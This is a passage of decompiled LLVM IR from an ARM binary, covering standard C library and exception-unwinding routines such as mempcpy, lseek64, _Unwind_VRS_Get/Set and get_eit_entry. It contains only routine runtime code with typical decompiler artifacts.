  %v2_16ad8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16ad8, i32* @r4, align 4
  ret i32 %v1_16adc

; uselistorder directives
  uselistorder i32 %v3_16a44, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16ad4, { 1, 0 }
  uselistorder label %dec_label_pc_16ac4, { 1, 0 }
  uselistorder label %dec_label_pc_16a74, { 1, 0 }
  uselistorder label %dec_label_pc_16a68, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_16ae4 = load i32, i32* @r4, align 4
  %v6_16ae4 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_16af4 = call i32 @memcpy()
  %v0_16af8 = load i32, i32* @r5, align 4
  %v1_16af8 = load i32, i32* @r4, align 4
  %v2_16af8 = add i32 %v1_16af8, %v0_16af8
  store i32 %v3_16ae4, i32* @r4, align 4
  store i32 %v6_16ae4, i32* @r5, align 4
  ret i32 %v2_16af8
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_16b08 = load i32, i32* @r1, align 4
  %v2_16b08 = icmp eq i32 %v0_16b08, 0
  %v3_16b0c = load i32, i32* @r4, align 4
  store i32 %v3_16b0c, i32* %stack_var_-8, align 4
  %v0_16b10 = load i32, i32* @r0, align 4
  store i32 %v0_16b10, i32* %r4.global-to-local, align 4
  br i1 %v2_16b08, label %dec_label_pc_16b34, label %dec_label_pc_16b18

dec_label_pc_16b18:                               ; preds = %entry
  %v1_16b20 = add i32 %v0_16b10, 260
  %v4_16b24 = call i32 @__GI_sigprocmask(i32 0, i32* null, i32 %v1_16b20)
  %v2_16b28 = icmp eq i32 %v4_16b24, 0
  br i1 %v2_16b28, label %dec_label_pc_16b38, label %dec_label_pc_16b34

dec_label_pc_16b34:                               ; preds = %dec_label_pc_16b18, %entry
  br label %dec_label_pc_16b38

dec_label_pc_16b38:                               ; preds = %dec_label_pc_16b18, %dec_label_pc_16b34
  %storemerge = phi i32 [ 0, %dec_label_pc_16b34 ], [ 1, %dec_label_pc_16b18 ]
  %v1_16b3c = load i32, i32* %r4.global-to-local, align 4
  %v2_16b3c = add i32 %v1_16b3c, 256
  %v3_16b3c = inttoptr i32 %v2_16b3c to i32*
  store i32 %storemerge, i32* %v3_16b3c, align 4
  %v2_16b40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16b40, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32, i32*, i32)* @__GI_sigprocmask, { 1, 2, 0 }
  uselistorder i32* null, { 8, 0, 3, 4, 1, 5, 6, 9, 10, 11, 12, 13, 14, 15, 7, 16, 17, 18, 19, 20, 2, 21, 22, 23 }
  uselistorder i32 260, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16b38, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ult i32 %arg1, -4095
  br i1 %tmp10, label %dec_label_pc_16b90, label %dec_label_pc_16b74

dec_label_pc_16b74:                               ; preds = %entry
  %v0_16b78 = call i32 @__aeabi_read_tp()
  %v3_16b7c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_16b7c = sext i16 %v3_16b7c to i32
  %v0_16b80 = load i32, i32* %r2.global-to-local, align 4
  %v1_16b80 = sub i32 0, %v0_16b80
  store i32 %v1_16b80, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16b88 = add i32 %v4_16b7c, %v0_16b78
  %v4_16b88 = inttoptr i32 %v3_16b88 to i32*
  store i32 %v1_16b80, i32* %v4_16b88, align 4
  %v0_16b98.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16b98

dec_label_pc_16b90:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_16b90 = icmp eq i32 %arg1, 0
  br i1 %v2_16b90, label %dec_label_pc_16ba4, label %dec_label_pc_16b98

dec_label_pc_16b98:                               ; preds = %dec_label_pc_16b90, %dec_label_pc_16b74
  %v0_16b98 = phi i32 [ %arg1, %dec_label_pc_16b90 ], [ %v0_16b98.pre, %dec_label_pc_16b74 ]
  %v3_16b9c = ashr i32 %v0_16b98, 31
  br label %dec_label_pc_16ba8

dec_label_pc_16ba4:                               ; preds = %dec_label_pc_16b90
  br label %dec_label_pc_16ba8

dec_label_pc_16ba8:                               ; preds = %dec_label_pc_16b98, %dec_label_pc_16ba4
  %v1_16bb0 = phi i32 [ %v0_16b98, %dec_label_pc_16b98 ], [ %tmp8, %dec_label_pc_16ba4 ]
  %storemerge = phi i32 [ %v3_16b9c, %dec_label_pc_16b98 ], [ %tmp, %dec_label_pc_16ba4 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_16bb0

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 11, 5, 6, 0, 7, 1, 8, 2, 9, 3, 10, 12, 4 }
  uselistorder i16 8, { 3, 0, 1, 2, 4, 5 }
  uselistorder i16* @global_var_20d6c.590, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 34, 66, 65, 33, 32, 29, 75, 74, 63, 64, 62, 61, 73, 72, 71, 70, 69, 68, 67, 31, 30, 28, 60, 59, 58, 54, 23, 22, 27, 57, 5, 12, 11, 10, 21, 20, 9, 3, 2, 53, 8, 7, 6, 52, 19, 18, 17, 14, 16, 15, 51, 50, 26, 25, 24, 38, 36, 49, 48, 47, 46, 35, 37, 45, 13, 4, 44, 43, 42, 41, 40, 39, 1, 0, 56, 55 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_16ba8, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_16bb8 = icmp eq i32 %regclass, 0
  br i1 %v2_16bb8, label %dec_label_pc_16bc0, label %dec_label_pc_16bf0

dec_label_pc_16bc0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16bc0
  %v6_16bc4 = icmp eq i32 %representation, 0
  br i1 %v6_16bc4, label %dec_label_pc_16bd4, label %bb8

.thread3:                                         ; preds = %dec_label_pc_16bc0
  br label %dec_label_pc_16bfc

bb8:                                              ; preds = %bb
  br label %dec_label_pc_16bfc

dec_label_pc_16bd4:                               ; preds = %bb
  %v3_16bd4 = mul i32 %regno, 4
  %v2_16bd8 = add i32 %v3_16bd4, %context
  %v1_16bdc = add i32 %v2_16bd8, 4
  %v2_16bdc = inttoptr i32 %v1_16bdc to i32*
  %v3_16bdc = load i32, i32* %v2_16bdc, align 4
  %v2_16be8 = bitcast i8* %valuep to i32*
  store i32 %v3_16bdc, i32* %v2_16be8, align 4
  ret i32 0

dec_label_pc_16bf0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_16bf0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_16bf0, %bb9
  %v0_16bf8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_16bf8)
  br label %dec_label_pc_16bfc

dec_label_pc_16bfc:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_16bfc, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_16c04 = icmp eq i32 %regclass, 0
  br i1 %v2_16c04, label %dec_label_pc_16c0c, label %dec_label_pc_16c3c

dec_label_pc_16c0c:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16c0c
  %v6_16c10 = icmp eq i32 %representation, 0
  br i1 %v6_16c10, label %dec_label_pc_16c20, label %bb8

.thread3:                                         ; preds = %dec_label_pc_16c0c
  br label %dec_label_pc_16c48

bb8:                                              ; preds = %bb
  br label %dec_label_pc_16c48

dec_label_pc_16c20:                               ; preds = %bb
  %v3_16c24 = mul i32 %regno, 4
  %v1_16c28 = bitcast i8* %valuep to i32*
  %v2_16c28 = load i32, i32* %v1_16c28, align 4
  %v2_16c2c = add i32 %v3_16c24, %context
  %v2_16c34 = add i32 %v2_16c2c, 4
  %v3_16c34 = inttoptr i32 %v2_16c34 to i32*
  store i32 %v2_16c28, i32* %v3_16c34, align 4
  ret i32 0

dec_label_pc_16c3c:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_16c3c
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_16c3c, %bb9
  %v0_16c44 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_16c44)
  br label %dec_label_pc_16c48

dec_label_pc_16c48:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_16c48, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_16c50 = add i32 %context, 68
  %v2_16c50 = inttoptr i32 %v1_16c50 to i32*
  %v3_16c50 = load i32, i32* %v2_16c50, align 4
  ret i32 %v3_16c50

; uselistorder directives
  uselistorder i32 68, { 10, 0, 8, 1, 9, 2, 4, 5, 6, 3, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_16c60 = add i32 %exc, 8
  %v2_16c60 = inttoptr i32 %v1_16c60 to i32*
  %v3_16c60 = load i32, i32* %v2_16c60, align 4
  %v2_16c64 = icmp eq i32 %v3_16c60, 0
  br i1 %v2_16c64, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_16c78 = xor i1 %v2_16c64, true
  call void @__pseudo_cond_branch(i1 %v2_16c78, i32 %v3_16c60)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_16c90 = call i32 @abort()
  ret i32 %v0_16c90
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_16c9c = call i32 @abort()
  ret i32 %v0_16c9c
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16ca0 = load i32, i32* @r4, align 4
  store i32 %v3_16ca0, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r5.global-to-local, align 4
  %v4_16cb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 132) to i32*), align 4
  %v2_16cb4 = icmp eq i32 %v4_16cb0, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_16cc0 = add i32 %return_address, -2
  store i32 %v1_16cc0, i32* %r4.global-to-local, align 4
  br i1 %v2_16cb4, label %dec_label_pc_16cf8, label %dec_label_pc_16cc8

dec_label_pc_16cc8:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_16cb0)
  %v2_16cd8 = icmp eq i32 %v1_16cc0, 0
  br i1 %v2_16cd8, label %.thread, label %dec_label_pc_16d18thread-pre-split

.thread:                                          ; preds = %dec_label_pc_16cc8
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_16ce0 = load i32, i32* %r6.global-to-local, align 4
  %v3_16ce0 = add i32 %v2_16ce0, 16
  %v4_16ce0 = inttoptr i32 %v3_16ce0 to i32*
  store i32 0, i32* %v4_16ce0, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16ce8:                               ; preds = %.thread, %.thread10, %dec_label_pc_16e90, %dec_label_pc_16e7c, %dec_label_pc_16e58, %dec_label_pc_16e30, %dec_label_pc_16d30
  %v0_16ce8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16cf0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16cf0, i32* @r4, align 4
  ret i32 %v0_16ce8

dec_label_pc_16cf8:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_16d00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 20) to i32*), align 4
  %v4_16d04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 48) to i32*), align 4
  store i32 %v4_16d04, i32* %r2.global-to-local, align 4
  %v2_16d08 = sub i32 %v4_16d00, %v4_16d04
  %v3_16d0c = sdiv i32 %v2_16d08, 8
  store i32 %v3_16d0c, i32* %stack_var_-36, align 4
  br label %dec_label_pc_16d18

dec_label_pc_16d18thread-pre-split:               ; preds = %dec_label_pc_16cc8
  %v3_16d18.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_16d18

dec_label_pc_16d18:                               ; preds = %dec_label_pc_16d18thread-pre-split, %dec_label_pc_16cf8
  %v0_16d5c.pre = phi i32 [ %v1_16cc0, %dec_label_pc_16d18thread-pre-split ], [ %v4_16d04, %dec_label_pc_16cf8 ]
  %v1_16d20 = phi i32 [ %v3_16d18.pr, %dec_label_pc_16d18thread-pre-split ], [ %v3_16d0c, %dec_label_pc_16cf8 ]
  %v2_16d1c = icmp eq i32 %v1_16d20, 0
  br i1 %v2_16d1c, label %dec_label_pc_16d30, label %dec_label_pc_16d4c.preheader

dec_label_pc_16d4c.preheader:                     ; preds = %dec_label_pc_16d18
  %v2_16d20 = add i32 %v1_16d20, -1
  %v1_16d7c = add i32 %v0_16d5c.pre, 8
  br label %dec_label_pc_16d4c.outer

dec_label_pc_16d30.loopexit:                      ; preds = %dec_label_pc_16da8
  br label %dec_label_pc_16d30

dec_label_pc_16d30:                               ; preds = %dec_label_pc_16d30.loopexit, %dec_label_pc_16d18, %dec_label_pc_16e74
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_16d38 = load i32, i32* %r6.global-to-local, align 4
  %v2_16d38 = add i32 %v1_16d38, 16
  %v3_16d38 = inttoptr i32 %v2_16d38 to i32*
  store i32 0, i32* %v3_16d38, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16d40:                               ; preds = %dec_label_pc_16d9c
  %v3_16d40 = icmp ult i32 %storemerge40, %v0_16da0
  br i1 %v3_16d40, label %dec_label_pc_16d48, label %dec_label_pc_16db8

dec_label_pc_16d48:                               ; preds = %dec_label_pc_16d40
  %v1_16d48 = add nsw i32 %v3_16d54, 1
  br label %dec_label_pc_16d4c.outer

dec_label_pc_16d4c.outer:                         ; preds = %dec_label_pc_16d48, %dec_label_pc_16d4c.preheader
  %v1_16da8.ph = phi i32 [ %v1_16d48, %dec_label_pc_16d48 ], [ 0, %dec_label_pc_16d4c.preheader ]
  %v0_16d4c.ph = phi i32 [ %v0_16d4c, %dec_label_pc_16d48 ], [ %v2_16d20, %dec_label_pc_16d4c.preheader ]
  br label %dec_label_pc_16d4c

dec_label_pc_16d4c:                               ; preds = %dec_label_pc_16d4c.outer, %dec_label_pc_16db0
  %v0_16d4c = phi i32 [ %v1_16db0, %dec_label_pc_16db0 ], [ %v0_16d4c.ph, %dec_label_pc_16d4c.outer ]
  %v2_16d4c = add i32 %v0_16d4c, %v1_16da8.ph
  %tmp = icmp slt i32 %v2_16d4c, 0
  %v4_16d50 = zext i1 %tmp to i32
  %v5_16d50 = add i32 %v4_16d50, %v2_16d4c
  %v3_16d54 = sdiv i32 %v5_16d50, 2
  %v3_16d58 = mul i32 %v3_16d54, 8
  store i32 %v3_16d58, i32* @ip, align 4
  %v2_16d5c = add i32 %v3_16d58, %v0_16d5c.pre
  %v3_16d5c = inttoptr i32 %v2_16d5c to i32*
  %v4_16d5c = load i32, i32* %v3_16d5c, align 4
  %v1_16d60 = and i32 %v4_16d5c, 1073741824
  %v2_16d60 = icmp eq i32 %v1_16d60, 0
  %v2_16d64 = or i32 %v4_16d5c, -2147483648
  %tmp79 = bitcast i32 %v4_16d5c to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_16d68 = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_16d60, i32 %v2_16d68, i32 %v2_16d64
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_16d6c = icmp eq i32 %v2_16d20, %v3_16d54
  store i32 %v2_16d5c, i32* %r7.global-to-local, align 4
  br i1 %v9_16d6c, label %dec_label_pc_16d9c, label %dec_label_pc_16d7c

dec_label_pc_16d7c:                               ; preds = %dec_label_pc_16d4c
  %v2_16d80 = add i32 %v3_16d58, %v1_16d7c
  %v3_16d80 = inttoptr i32 %v2_16d80 to i32*
  %v4_16d80 = load i32, i32* %v3_16d80, align 4
  %v1_16d88 = and i32 %v4_16d80, 1073741824
  %v2_16d88 = icmp eq i32 %v1_16d88, 0
  %v2_16d8c = or i32 %v4_16d80, -2147483648
  %tmp81 = bitcast i32 %v4_16d80 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_16d90 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_16d88, i32 %v2_16d90, i32 %v2_16d8c
  %v1_16d94 = add i32 %v2_16d80, -1
  %v2_16d98 = add i32 %storemerge39, %v1_16d94
  br label %dec_label_pc_16d9c

dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16d4c, %dec_label_pc_16d7c
  %storemerge40 = phi i32 [ %v2_16d98, %dec_label_pc_16d7c ], [ -1, %dec_label_pc_16d4c ]
  %v2_16d9c = add i32 %storemerge, %v2_16d5c
  %v0_16da0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16da0 = icmp ult i32 %v0_16da0, %v2_16d9c
  br i1 %v3_16da0, label %dec_label_pc_16da8, label %dec_label_pc_16d40

dec_label_pc_16da8:                               ; preds = %dec_label_pc_16d9c
  %v9_16da8 = icmp eq i32 %v3_16d54, %v1_16da8.ph
  br i1 %v9_16da8, label %dec_label_pc_16d30.loopexit, label %dec_label_pc_16db0

dec_label_pc_16db0:                               ; preds = %dec_label_pc_16da8
  %v1_16db0 = add nsw i32 %v3_16d54, -1
  br label %dec_label_pc_16d4c

dec_label_pc_16db8:                               ; preds = %dec_label_pc_16d40
  %v2_16db8 = load i32, i32* %v3_16d5c, align 4
  %v1_16dbc = and i32 %v2_16db8, 1073741824
  %v2_16dbc = icmp eq i32 %v1_16dbc, 0
  %v2_16dc0 = or i32 %v2_16db8, -2147483648
  %tmp83 = bitcast i32 %v2_16db8 to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_16dc4 = bitcast float %tmp84 to i32
  %v0_16dc8 = select i1 %v2_16dbc, i32 %v2_16dc4, i32 %v2_16dc0
  %v2_16dc8 = add i32 %v0_16dc8, %v2_16d5c
  %v1_16dcc = load i32, i32* %r6.global-to-local, align 4
  %v2_16dcc = add i32 %v1_16dcc, 72
  %v3_16dcc = inttoptr i32 %v2_16dcc to i32*
  store i32 %v2_16dc8, i32* %v3_16dcc, align 4
  %v0_16dd0 = load i32, i32* %r7.global-to-local, align 4
  %v1_16dd0 = add i32 %v0_16dd0, 4
  %v2_16dd0 = inttoptr i32 %v1_16dd0 to i32*
  %v3_16dd0 = load i32, i32* %v2_16dd0, align 4
  %v7_16dd4 = icmp eq i32 %v3_16dd0, 1
  br i1 %v7_16dd4, label %.thread10, label %dec_label_pc_16de8

.thread10:                                        ; preds = %dec_label_pc_16db8
  %v1_16dd4 = add i32 %v3_16dd0, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_16de0 = load i32, i32* %r6.global-to-local, align 4
  %v3_16de0 = add i32 %v2_16de0, 16
  %v4_16de0 = inttoptr i32 %v3_16de0 to i32*
  store i32 %v1_16dd4, i32* %v4_16de0, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16de8:                               ; preds = %dec_label_pc_16db8
  %v1_16de8 = icmp slt i32 %v3_16dd0, 0
  br i1 %v1_16de8, label %.thread38, label %dec_label_pc_16e00

.thread38:                                        ; preds = %dec_label_pc_16de8
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_16df4 = load i32, i32* %r6.global-to-local, align 4
  %v5_16df4 = add i32 %v4_16df4, 76
  %v6_16df4 = inttoptr i32 %v5_16df4 to i32*
  store i32 %v1_16dd0, i32* %v6_16df4, align 4
  %v3_16df8 = load i32, i32* %r2.global-to-local, align 4
  %v4_16df8 = load i32, i32* %r6.global-to-local, align 4
  %v5_16df8 = add i32 %v4_16df8, 80
  %v6_16df8 = inttoptr i32 %v5_16df8 to i32*
  store i32 %v3_16df8, i32* %v6_16df8, align 4
  br label %dec_label_pc_16e20

dec_label_pc_16e00:                               ; preds = %dec_label_pc_16de8
  %v1_16e00 = and i32 %v3_16dd0, 1073741824
  %v2_16e00 = icmp eq i32 %v1_16e00, 0
  %v2_16e04 = or i32 %v3_16dd0, -2147483648
  %tmp85 = bitcast i32 %v3_16dd0 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_16e08 = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_16e00, i32 %v2_16e08, i32 %v2_16e04
  %v1_16e0c = add i32 %storemerge42, 4
  %v2_16e10 = add i32 %v1_16e0c, %v0_16dd0
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_16e18 = load i32, i32* %r6.global-to-local, align 4
  %v2_16e18 = add i32 %v1_16e18, 76
  %v3_16e18 = inttoptr i32 %v2_16e18 to i32*
  store i32 %v2_16e10, i32* %v3_16e18, align 4
  %v0_16e1c = load i32, i32* %r2.global-to-local, align 4
  %v1_16e1c = load i32, i32* %r6.global-to-local, align 4
  %v2_16e1c = add i32 %v1_16e1c, 80
  %v3_16e1c = inttoptr i32 %v2_16e1c to i32*
  store i32 %v0_16e1c, i32* %v3_16e1c, align 4
  br label %dec_label_pc_16e20

dec_label_pc_16e20:                               ; preds = %.thread38, %dec_label_pc_16e00
  %v0_16e20 = load i32, i32* %r6.global-to-local, align 4
  %v1_16e20 = add i32 %v0_16e20, 76
  %v2_16e20 = inttoptr i32 %v1_16e20 to i32*
  %v3_16e20 = load i32, i32* %v2_16e20, align 4
  store i32 %v3_16e20, i32* %r2.global-to-local, align 4
  %v1_16e24 = inttoptr i32 %v3_16e20 to i32*
  %v2_16e24 = load i32, i32* %v1_16e24, align 4
  %v1_16e28 = icmp slt i32 %v2_16e24, 0
  br i1 %v1_16e28, label %dec_label_pc_16e4c, label %dec_label_pc_16e30

dec_label_pc_16e30:                               ; preds = %dec_label_pc_16e20
  %v1_16e30 = and i32 %v2_16e24, 1073741824
  %v2_16e30 = icmp eq i32 %v1_16e30, 0
  %v2_16e34 = or i32 %v2_16e24, -2147483648
  %tmp87 = bitcast i32 %v2_16e24 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_16e38 = bitcast float %tmp88 to i32
  %v0_16e3c = select i1 %v2_16e30, i32 %v2_16e38, i32 %v2_16e34
  %v2_16e3c = add i32 %v0_16e3c, %v3_16e20
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_16e44 = add i32 %v0_16e20, 16
  %v3_16e44 = inttoptr i32 %v2_16e44 to i32*
  store i32 %v2_16e3c, i32* %v3_16e44, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16e4c:                               ; preds = %dec_label_pc_16e20
  %v3_16e4c = udiv i32 %v2_16e24, 16777216
  %v1_16e50 = urem i32 %v3_16e4c, 16
  %v2_16e50 = icmp eq i32 %v1_16e50, 0
  br i1 %v2_16e50, label %dec_label_pc_16e58, label %dec_label_pc_16e6c

dec_label_pc_16e58:                               ; preds = %dec_label_pc_16e4c
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_16e60 = load i32, i32* %r5.global-to-local, align 4
  %v2_16e60 = add i32 %v0_16e60, -38056
  %v2_16e64 = add i32 %v0_16e20, 16
  %v3_16e64 = inttoptr i32 %v2_16e64 to i32*
  store i32 %v2_16e60, i32* %v3_16e64, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16e6c:                               ; preds = %dec_label_pc_16e4c
  %v7_16e6c = icmp eq i32 %v1_16e50, 1
  br i1 %v7_16e6c, label %dec_label_pc_16e90, label %dec_label_pc_16e74

dec_label_pc_16e74:                               ; preds = %dec_label_pc_16e6c
  %v7_16e74 = icmp eq i32 %v1_16e50, 2
  br i1 %v7_16e74, label %dec_label_pc_16e7c, label %dec_label_pc_16d30

dec_label_pc_16e7c:                               ; preds = %dec_label_pc_16e74
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_16e84 = load i32, i32* %r5.global-to-local, align 4
  %v2_16e84 = add i32 %v0_16e84, -38072
  %v2_16e88 = add i32 %v0_16e20, 16
  %v3_16e88 = inttoptr i32 %v2_16e88 to i32*
  store i32 %v2_16e84, i32* %v3_16e88, align 4
  br label %dec_label_pc_16ce8

dec_label_pc_16e90:                               ; preds = %dec_label_pc_16e6c
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_16e98 = load i32, i32* %r5.global-to-local, align 4
  %v2_16e98 = add i32 %v0_16e98, -38064
  %v2_16e9c = add i32 %v0_16e20, 16
  %v3_16e9c = inttoptr i32 %v2_16e9c to i32*
  store i32 %v2_16e98, i32* %v3_16e9c, align 4
  br label %dec_label_pc_16ce8

; uselistorder directives
  uselistorder i32 %v1_16e50, { 2, 1, 0 }
  uselistorder i32 %v0_16e20, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_16dd0, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_16da0, { 1, 0 }
  uselistorder i32 %v3_16d58, { 2, 1, 0 }
  uselistorder i32 %v3_16d54, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_16d4c, { 1, 0 }
  uselistorder i32 %v0_16d4c, { 1, 0 }
  uselistorder i32 %v2_16d20, { 1, 0 }
  uselistorder i32 %v0_16d5c.pre, { 1, 0 }
  uselistorder i32 %v3_16d0c, { 1, 0 }
  uselistorder i32 %v1_16cc0, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_16e20, { 1, 0 }
  uselistorder label %dec_label_pc_16d9c, { 1, 0 }
  uselistorder label %dec_label_pc_16d4c, { 1, 0 }
  uselistorder label %dec_label_pc_16d30, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16ce8, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_16ea8(i32 %arg1) local_unnamed_addr {
dec_label_pc_16ea8:
  %v0_16ea8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16ea8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16ea8
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16ea8, %bb
  %v10_16eb0 = phi i32 [ %arg1, %dec_label_pc_16ea8 ], [ 0, %bb ]
  ret i32 %v10_16eb0

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_16ec4 = add i32 %entry_vrs, 4
